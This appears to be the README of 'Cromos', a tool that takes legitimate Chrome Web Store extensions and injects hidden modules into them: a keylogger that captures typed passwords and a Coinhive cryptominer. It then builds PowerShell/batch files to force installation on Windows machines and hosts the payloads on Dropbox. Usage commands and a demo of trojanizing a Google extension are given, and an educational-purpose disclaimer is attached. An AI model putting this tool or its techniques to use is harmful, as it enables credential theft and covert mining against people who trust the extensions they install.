# Cromos 

Cromos is a tool for downloading legitimate extensions of the Chrome Web Store and inject codes in the background of the application and more cromos create executable files to force installation via <strong>PowerShell</strong> for example, and also upload files to dropbox to host the malicious files.

  - Download extension
  - Injections
  - Upload files on dropbox
  - Windows infection
  
### Group Policy Object (GPO) 
Chrome allows you to add extensions using Windows
Group Policy Object (GPO) if you need to force installation on multiple machines just follow the steps in the <a href="https://docs.google.com/document/d/1iu6I0MhyrvyS5h5re5ai8RSVO2sYx2gWI4Zk4Tp6fgc"> Chrome Deployment Guide </a> 
then modify the original extension with few modifications you can publish your extension in the Chrome Web Store requires to pay $5.

### Support
If you chose to generate a batch file to force installation the script in powershell that will be downloaded is compatible Windows, 7, 8 10 with versions of powershell >= 3.0

  
  ### Demo
  This is a demonstration of the tool at work in this examples I'm downloading a famous Google extension called G Suite Training on Google Chrome Web Store and injecting a mining module.
  
  
<a href="https://asciinema.org/a/2kLKxkIkxXcN7oyzVq1ywndKt?autoplay=1"><img src="https://asciinema.org/a/2kLKxkIkxXcN7oyzVq1ywndKt.png"/></a>
  
  ### Installation
  
```
$ cd $HOME/
$ git clone https://github.com/fbctf/cromos
$ sudo chmod -R 777 cromos/
$ cd cromos && python setup.py
```
 ### Usage
 ##### Downloading the extension
 ```
Usage: python cromos.py --extension {id}
 ```
 ##### Downloading the extension and loading module
 
 ```
Usage: python cromos.py --extension {id} --load {currency/keylogger}
```
 ##### Build a batch file and upload the files in dropbox
 
 ```
 Usage: python cromos.py --extension {id} --build {bat} --token {dropboxToken}
 ```

 
 
### Modules
You can also inject some predefined modules in the background as <strong>keylogger</strong>, <strong>virtual currency</strong>.

Module | Description
--------|------------
modules/keylogger | This module captures all the passwords you type in an infected browser over https or not.
modules/currency | This module allows you to mine virtual coins using the coinhive API, you just need to have an account.

### Disclaimer
Code samples are provided for educational purposes. Adequate defenses can only be built by researching attack techniques available to malicious actors. Using this code against target systems without prior permission is illegal in most jurisdictions. The authors are not liable for any damages from misuse of this information or code.


## Donations
* XMR: `49m12JEEC6HPCHkLMX5QL4SrDQdKwh6eb4Muu8Z9CwA9MwemhzFQ3VcgHwyuR73rC22WCymTUyep7DVrfN3GPt5JBCekPrR `

## Contacts
* fbctf@riseup.net
* [twitter](https://www.twitter.com/fbctf)
